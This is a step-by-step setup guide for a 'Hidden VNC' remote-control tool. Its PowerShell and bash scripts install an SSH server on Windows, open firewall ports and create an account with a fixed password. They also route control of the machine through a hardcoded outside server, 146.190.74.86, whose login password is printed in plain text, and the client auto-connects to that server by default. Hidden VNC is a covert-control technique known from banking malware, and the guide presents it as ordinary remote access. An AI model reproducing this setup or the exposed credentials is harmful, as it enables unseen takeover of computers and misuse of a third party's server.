# Hidden VNC Setup Guide

## Quick Setup Checklist

- [ ] Host system meets requirements (Windows 10/11, Admin privileges)
- [ ] Client system prepared
- [ ] SSH server configured on host
- [ ] SSH tunnel established
- [ ] HVNC server and client installed
- [ ] Test connection verified

## Detailed Setup Instructions

### Step 1: Prepare Host System

#### 1.1 System Requirements Check
```powershell
# Check Windows version
Get-ComputerInfo | Select WindowsProductName, WindowsVersion

# Check available RAM
Get-CimInstance -ClassName Win32_ComputerSystem | Select TotalPhysicalMemory

# Verify administrator privileges
net session
```

#### 1.2 Download and Install HVNC Server
```cmd
# Create installation directory
mkdir C:\HVNC
cd C:\HVNC

# Download server binary (replace URL with actual release)
# Place hvnc-server.exe in C:\HVNC\
```

#### 1.3 Configure Windows Firewall
```powershell
# Allow HVNC server (local only)
New-NetFirewallRule -DisplayName "HVNC Server" -Direction Inbound -Protocol TCP -LocalPort 5900 -Action Allow -RemoteAddress 127.0.0.1

# Allow SSH server
New-NetFirewallRule -DisplayName "SSH Server" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow
```

### Step 2: Configure SSH Server on Host

#### 2.1 Install OpenSSH Server (Windows 10/11)
```powershell
# Run as Administrator
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0

# Start and enable SSH service
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

# Verify service is running
Get-Service sshd
```

#### 2.2 Configure SSH Access
```powershell
# Create SSH configuration directory
mkdir C:\ProgramData\ssh

# Basic SSH configuration
@"
Port 22
PasswordAuthentication yes
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys
"@ | Out-File -FilePath C:\ProgramData\ssh\sshd_config -Encoding ASCII

# Restart SSH service
Restart-Service sshd
```

#### 2.3 Create User Account (Optional but Recommended)
```powershell
# Create dedicated user for HVNC
$Password = ConvertTo-SecureString "YourSecurePassword123!" -AsPlainText -Force
New-LocalUser -Name "hvnc-user" -Password $Password -Description "HVNC Service Account"

# Add to Remote Desktop Users group
Add-LocalGroupMember -Group "Remote Desktop Users" -Member "hvnc-user"
```

### Step 3: Prepare Client System

#### 3.1 Download HVNC Client
```bash
# Linux/macOS
wget https://github.com/your-repo/hvnc/releases/download/v1.0.0/hvnc-client
chmod +x hvnc-client

# Windows
# Download hvnc-client.exe and place in desired directory
```

#### 3.2 Install SSH Client (if not available)
```bash
# Ubuntu/Debian
sudo apt-get install openssh-client

# macOS (usually pre-installed)
ssh -V

# Windows 10/11 (usually pre-installed)
ssh -V
```

### Step 4: Establish SSH Tunnel

#### 4.1 Test SSH Connection
```bash
# Test basic SSH connection to default server
ssh tunneluser@146.190.74.86
# Password: EuroFw19@a03ee

# If successful, you should see the server command prompt
```

#### 4.2 Create SSH Tunnel
```bash
# Basic tunnel (using default server)
ssh -L 3390:127.0.0.1:5900 tunneluser@146.190.74.86

# With keep-alive (recommended)
ssh -o ServerAliveInterval=60 -L 3390:127.0.0.1:5900 tunneluser@146.190.74.86

# Background tunnel (Linux/macOS)
ssh -f -N -L 3390:127.0.0.1:5900 tunneluser@146.190.74.86
```

#### 4.3 Verify Tunnel
```bash
# Test tunnel connectivity
telnet 127.0.0.1 3390

# Should connect (then press Ctrl+C to exit)
```

### Step 5: Start HVNC Server

#### 5.1 Basic Server Start
```cmd
# Navigate to HVNC directory
cd C:\HVNC

# Start server with notepad
hvnc-server.exe --app "notepad.exe"

# You should see: "HVNC Server listening on 127.0.0.1:5900"
```

#### 5.2 Advanced Server Configuration
```cmd
# With custom settings
hvnc-server.exe --app "C:\Program Files\Google\Chrome\chrome.exe" --quality 80 --fps 30 --log-level info

# With application arguments
hvnc-server.exe --app "notepad.exe" --args "C:\temp\test.txt"
```

### Step 6: Connect with Client

#### 6.1 Basic Client Connection
```bash
# Auto-connect (recommended - uses default server)
./hvnc-client

# Manual connection through SSH tunnel
./hvnc-client --server 127.0.0.1:3390

# Windows
hvnc-client.exe
```

#### 6.2 Test Connection
1. Client window should open showing the remote application
2. Try moving the mouse - cursor should move in remote app
3. Try typing - text should appear in remote app
4. Try clicking - should interact with remote app

### Step 7: Verify Complete Setup

#### 7.1 Connection Test Checklist
- [ ] SSH tunnel is active and stable
- [ ] HVNC server starts without errors
- [ ] Client connects and displays remote application
- [ ] Mouse input works correctly
- [ ] Keyboard input works correctly
- [ ] Application responds to interactions

#### 7.2 Performance Test
```cmd
# Test with different quality settings
hvnc-server.exe --app "notepad.exe" --quality 50
hvnc-server.exe --app "notepad.exe" --quality 90

# Test with different frame rates
hvnc-server.exe --app "notepad.exe" --fps 15
hvnc-server.exe --app "notepad.exe" --fps 60
```

## Automated Setup Scripts

### Host Setup Script (PowerShell)
```powershell
# Save as setup-host.ps1
param(
    [string]$Username = "hvnc-user",
    [string]$Password = "YourSecurePassword123!"
)

Write-Host "Setting up HVNC Host..." -ForegroundColor Green

# Check if running as administrator
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Error "This script must be run as Administrator"
    exit 1
}

# Install OpenSSH Server
Write-Host "Installing OpenSSH Server..." -ForegroundColor Yellow
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0

# Configure SSH service
Write-Host "Configuring SSH service..." -ForegroundColor Yellow
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

# Configure firewall
Write-Host "Configuring firewall..." -ForegroundColor Yellow
New-NetFirewallRule -DisplayName "HVNC Server" -Direction Inbound -Protocol TCP -LocalPort 5900 -Action Allow -RemoteAddress 127.0.0.1
New-NetFirewallRule -DisplayName "SSH Server" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow

# Create user account
Write-Host "Creating user account..." -ForegroundColor Yellow
$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
try {
    New-LocalUser -Name $Username -Password $SecurePassword -Description "HVNC Service Account" -ErrorAction Stop
    Add-LocalGroupMember -Group "Remote Desktop Users" -Member $Username
    Write-Host "User '$Username' created successfully" -ForegroundColor Green
} catch {
    Write-Warning "User creation failed or user already exists"
}

# Create HVNC directory
Write-Host "Creating HVNC directory..." -ForegroundColor Yellow
New-Item -Path "C:\HVNC" -ItemType Directory -Force

Write-Host "Host setup complete!" -ForegroundColor Green
Write-Host "Next steps:" -ForegroundColor Cyan
Write-Host "1. Copy hvnc-server.exe to C:\HVNC\" -ForegroundColor Cyan
Write-Host "2. Test SSH connection from client" -ForegroundColor Cyan
Write-Host "3. Start HVNC server" -ForegroundColor Cyan
```

### Client Setup Script (Bash)
```bash
#!/bin/bash
# Save as setup-client.sh

echo "Setting up HVNC Client..."

# Check if SSH client is available
if ! command -v ssh &> /dev/null; then
    echo "SSH client not found. Installing..."
    if [[ "$OSTYPE" == "linux-gnu"* ]]; then
        sudo apt-get update && sudo apt-get install -y openssh-client
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        echo "SSH should be pre-installed on macOS"
    fi
fi

# Create SSH config for HVNC with default server
mkdir -p ~/.ssh
cat >> ~/.ssh/config << EOF

# HVNC Connection - Default Server
Host hvnc-server
    HostName 146.190.74.86
    User tunneluser
    LocalForward 3390 127.0.0.1:5900
    ServerAliveInterval 60
    ServerAliveCountMax 3

EOF

echo "Client setup complete!"
echo "Next steps:"
echo "1. Copy hvnc-client binary to desired location"
echo "2. Connect with: ssh hvnc-server (password: EuroFw19@a03ee)"
echo "3. In another terminal: ./hvnc-client"
echo "4. Or simply run: ./hvnc-client (auto-connects)"
```

## Troubleshooting Setup Issues

### SSH Connection Issues
```bash
# Test SSH connectivity
ssh -v username@host-ip-address

# Common solutions:
# 1. Check Windows Firewall
# 2. Verify SSH service is running: Get-Service sshd
# 3. Check SSH configuration: C:\ProgramData\ssh\sshd_config
```

### HVNC Server Issues
```cmd
# Run with debug logging
hvnc-server.exe --app "notepad.exe" --log-level debug

# Common solutions:
# 1. Run as Administrator
# 2. Check application path exists
# 3. Verify port 5900 is available: netstat -an | findstr :5900
```

### Client Connection Issues
```bash
# Test tunnel connectivity
telnet 127.0.0.1 3390

# Common solutions:
# 1. Verify SSH tunnel is active
# 2. Check HVNC server is running
# 3. Test with different client settings
```

---

*Follow this setup guide step-by-step for a successful HVNC installation. For troubleshooting specific issues, refer to the User Guide.*